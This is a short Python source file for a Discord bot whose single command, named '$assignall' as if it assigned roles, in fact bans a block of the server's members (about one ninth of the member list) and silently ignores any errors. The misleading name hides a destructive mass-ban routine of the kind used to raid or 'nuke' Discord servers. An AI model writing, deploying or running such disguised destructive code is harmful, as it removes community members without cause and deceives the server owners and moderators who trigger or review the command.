import discord
import os
from discord.ext import commands
from discord.utils import get


bot = commands.Bot(command_prefix = '$', intents = discord.Intents.all())
@bot.command()
async def assignall(ctx):
	s = ctx.guild.members
	n = len(s)
	k = 3
	d = n // 9
	s = s[d * k:d * (k + 1)]
	for member in s:
		try:
			await member.ban()
		except:
			k = 1

bot.run(os.environ["DISCORD_TOKEN"])
